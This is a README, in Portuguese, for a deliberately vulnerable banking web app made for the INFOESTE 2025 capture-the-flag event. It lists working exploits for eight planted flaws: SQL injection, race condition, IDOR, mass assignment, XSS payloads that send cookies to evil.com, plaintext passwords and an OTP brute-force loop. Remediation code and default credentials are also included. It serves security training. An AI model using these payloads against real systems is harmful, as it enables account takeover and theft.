# 🏦 Banco Digital - CTF INFOESTE 2025

Aplicação bancária web vulnerável desenvolvida para o CTF (Capture The Flag) do INFOESTE 2025. O objetivo é encontrar e explorar as vulnerabilidades intencionais implementadas no sistema.

## 📋 Sobre o Projeto

Este é um sistema bancário completo com funcionalidades de:
- Cadastro e autenticação de usuários
- Dashboard bancário
- Transferências entre contas
- Feed social com posts e comentários
- Perfis de usuários
- Painel administrativo

**⚠️ ATENÇÃO:** Este projeto contém vulnerabilidades intencionais para fins educacionais. **NUNCA** use em produção!

## 🚀 Como Executar

### Requisitos
- Docker
- Docker Compose

### Iniciar o Projeto
```bash
# Clone o repositório
git clone https://github.com/Henrique-Gomesz/INFOESTE-2025-CTF.git
cd INFOESTE-2025-CTF

# Suba os containers
docker compose up --build

# Acesse a aplicação
http://localhost:3000
```

### Usuários Pré-cadastrados
| Nome | Email | Senha | Role | Saldo Inicial |
|------|-------|-------|------|---------------|
| Alice Silva | alice@bancodigital.com | admin | admin | R$ 5.000,00 |
| Bruno Costa | bruno@bancodigital.com | bruno123 | user | R$ 3.000,00 |
| Carla Santos | carla@bancodigital.com | carla123 | user | R$ 2.000,00 |
| Daniel Oliveira | daniel@bancodigital.com | daniel123 | user | R$ 1.500,00 |

## 🎯 Vulnerabilidades Implementadas

### 1. 💉 SQL Injection (Busca de Usuários)

**Localização:** `GET /api/users?q=`

**Descrição:** A busca de usuários concatena diretamente a query do usuário sem sanitização.

**Exploit:**
```bash
# Ver todas as senhas do sistema
http://localhost:3000/api/users?q=' UNION SELECT NULL, email, password FROM users #

# Ver emails de todos
http://localhost:3000/api/users?q=' UNION SELECT id, name, email FROM users --

# Ver informações sensíveis
http://localhost:3000/api/users?q=' UNION SELECT id, account_number, CAST(balance AS CHAR) FROM users --
```

**Interface:** Login como admin → `/users.html` → Use a busca

---

### 2. 🏃 Race Condition (Transferências)

**Localização:** `POST /api/users/transfer`

**Descrição:** Transferências não usam transações atômicas nem locks, permitindo múltiplas transferências simultâneas antes da verificação de saldo.

**Exploit:**
```bash
# Fazer 5 transferências simultâneas com saldo para apenas 1
# Login como Bruno (saldo: R$ 3.000)
# Transferir R$ 2.500 para Carla 5 vezes ao mesmo tempo

# Via interface:
1. Acesse /transfer.html
2. Digite: Conta destino: 3-003, Valor: 2500
3. Clique em "Teste Race Condition (5x)"
4. Verifique que foram feitas 5 transferências de R$ 2.500 (total: R$ 12.500) com apenas R$ 3.000 de saldo!
```

**Interface:** `/transfer.html` → Botão "Teste Race Condition (5x)"

---

### 3. 🔓 IDOR - Insecure Direct Object Reference

**Localização:** `GET /user.html?id=`

**Descrição:** Qualquer usuário pode acessar o perfil de outros usuários apenas alterando o parâmetro `id` na URL.

**Exploit:**
```bash
# Acesse perfis de outros usuários
http://localhost:3000/user.html?id=1  # Ver perfil da Alice (admin)
http://localhost:3000/user.html?id=2  # Ver perfil do Bruno
http://localhost:3000/user.html?id=3  # Ver perfil da Carla

# Veja informações privadas como número da conta e biografia
```

---

### 4. 🎭 Mass Assignment (Atualização de Perfil)

**Localização:** `PUT /api/users/:id`

**Descrição:** Endpoint aceita qualquer campo do modelo User sem whitelist, permitindo alterar campos sensíveis.

**Exploit:**
```bash
# Promover-se a admin
curl -X PUT http://localhost:3000/api/users/2 \
  -H "Content-Type: application/json" \
  -b "uid=2; token=<seu_token>" \
  -d '{"role": "admin"}'

# Aumentar seu próprio saldo
curl -X PUT http://localhost:3000/api/users/2 \
  -H "Content-Type: application/json" \
  -b "uid=2; token=<seu_token>" \
  -d '{"balance": 999999}'

# Alterar email de outro usuário
curl -X PUT http://localhost:3000/api/users/3 \
  -H "Content-Type: application/json" \
  -b "uid=2; token=<seu_token>" \
  -d '{"email": "hacked@evil.com"}'
```

**Via Interface:**
1. Abra DevTools (F12) → Console
2. Execute:
```javascript
await fetch('/api/users/2', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({role: 'admin', balance: 999999})
})
```

---

### 5. 🚨 XSS - Stored (Comentários)

**Localização:** Comentários em perfis de usuários

**Descrição:** Comentários não são sanitizados, permitindo injeção de JavaScript que é executado para todos que visualizam o perfil.

**Exploit:**
```bash
# No campo de comentário, insira:
<script>alert('XSS!')</script>

# Roubar cookies
<script>fetch('http://evil.com?cookie='+document.cookie)</script>

# Redirecionar vítimas
<script>window.location='http://evil.com'</script>

# Inserir imagem maliciosa
<img src=x onerror="alert('XSS')">
```

**Interface:** Acesse qualquer perfil → Deixe um comentário com payload

---

### 6. 🔍 XSS - Reflected (Busca de Usuários)

**Localização:** `GET /api/users?q=` - Query refletida na resposta

**Descrição:** O termo de busca é refletido na resposta sem sanitização.

**Exploit:**
```bash
# URL maliciosa
http://localhost:3000/users.html?search=<script>alert('XSS')</script>

# Roubar sessão do admin
http://localhost:3000/users.html?search=<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">
```

---

### 7. 🔑 Senhas em Texto Plano

**Localização:** Banco de dados `users` table

**Descrição:** Senhas são armazenadas em texto plano sem hash.

**Exploit:**
```bash
# Via SQL Injection
http://localhost:3000/api/users?q=' UNION SELECT id, email, password FROM users --

# Resultado:
# alice@bancodigital.com: admin
# bruno@bancodigital.com: bruno123
# carla@bancodigital.com: carla123
```

**Acesso direto ao DB:**
```bash
# Adminer em http://localhost:8080
# Servidor: db
# Usuário: root
# Senha: rootpassword
# Base: banco_digital

SELECT * FROM users;
```

---

### 8. 📱 OTP Bypass (Esqueci Minha Senha)

**Localização:** `/forgot-password.html`

**Descrição:** OTP é gerado de forma previsível (6 dígitos sequenciais do timestamp) e não expira.

**Exploit:**
```bash
# 1. Solicite recuperação de senha para qualquer email
# 2. O OTP aparece no console do servidor
# 3. OTP pode ser brute-forced (000000 a 999999)

# Via API:
curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "alice@bancodigital.com"}'

# OTP é gerado mas não validado com expiração
# Teste códigos sequenciais ou veja logs do servidor
```

**Script de Brute Force:**
```bash
for i in {000000..999999}; do
  curl -X POST http://localhost:3000/api/auth/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"alice@bancodigital.com\",\"otp\":\"$i\",\"newPassword\":\"hacked\"}"
done
```

---

## 🛠️ Tecnologias

- **Backend:** Node.js + Express
- **ORM:** Sequelize
- **Banco de Dados:** MySQL 8.0
- **Frontend:** HTML5, CSS3, Vanilla JavaScript
- **Containerização:** Docker + Docker Compose

## 📁 Estrutura do Projeto

```
├── db/
│   └── init/           # Scripts SQL de inicialização
├── public/             # Frontend (HTML, CSS, JS)
│   ├── css/
│   └── js/
├── src/
│   ├── models/         # Modelos Sequelize
│   ├── routes/         # Rotas da API
│   ├── utils/          # Utilitários (auth, db)
│   └── server.js       # Servidor principal
├── docker-compose.yml
├── Dockerfile
└── package.json
```

## 🎓 Objetivos de Aprendizado

1. Identificar vulnerabilidades comuns em aplicações web
2. Compreender o impacto de cada vulnerabilidade
3. Praticar técnicas de exploração ética
4. Aprender como prevenir estas vulnerabilidades

## 🔒 Como Corrigir as Vulnerabilidades

### SQL Injection
```javascript
// ❌ Vulnerável
const query = `SELECT * FROM users WHERE name LIKE '%${q}%'`;

// ✅ Seguro
const users = await User.findAll({
  where: { name: { [Op.like]: `%${q}%` } }
});
```

### Race Condition
```javascript
// ✅ Usar transação atômica com locks
const result = await sequelize.transaction(async (t) => {
  const sender = await User.findByPk(senderId, { 
    lock: t.LOCK.UPDATE, transaction: t 
  });
  // ... resto da lógica
});
```

### IDOR
```javascript
// ✅ Verificar autorização
if (req.user.id !== userId && req.user.role !== 'admin') {
  return res.status(403).json({ error: 'Acesso negado' });
}
```

### Mass Assignment
```javascript
// ✅ Whitelist de campos permitidos
const allowedFields = ['name', 'bio'];
const updateData = {};
allowedFields.forEach(field => {
  if (req.body[field]) updateData[field] = req.body[field];
});
```

### XSS
```javascript
// ✅ Sanitizar entrada e escapar saída
import DOMPurify from 'dompurify';
const cleanBody = DOMPurify.sanitize(req.body.comment);
```

### Senhas
```javascript
// ✅ Hash com bcrypt
import bcrypt from 'bcrypt';
const hashedPassword = await bcrypt.hash(password, 10);
```

### OTP
```javascript
// ✅ Gerar OTP criptograficamente seguro com expiração
import crypto from 'crypto';
const otp = crypto.randomInt(100000, 999999).toString();
const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 min
```

## 📚 Documentação Adicional

- [RACE_CONDITION_VULNERABILITY.md](RACE_CONDITION_VULNERABILITY.md) - Detalhes sobre race condition
- [SQL_INJECTION_VULNERABILITY.md](SQL_INJECTION_VULNERABILITY.md) - Detalhes sobre SQL injection
- [ADMIN_ADD_BALANCE.md](ADMIN_ADD_BALANCE.md) - Funcionalidade admin de adicionar saldo

## ⚠️ Disclaimer

Este projeto foi desenvolvido exclusivamente para fins educacionais e treinamento em segurança cibernética. As vulnerabilidades são intencionais e não devem ser replicadas em aplicações reais. O uso inadequado destas técnicas pode ser ilegal.

## 👥 Contribuidores

Desenvolvido para o **INFOESTE 2025 CTF**

## 📝 Licença

Este projeto é de código aberto para fins educacionais.

---

**🎯 Boa sorte no CTF! Capture todas as flags! 🚩**
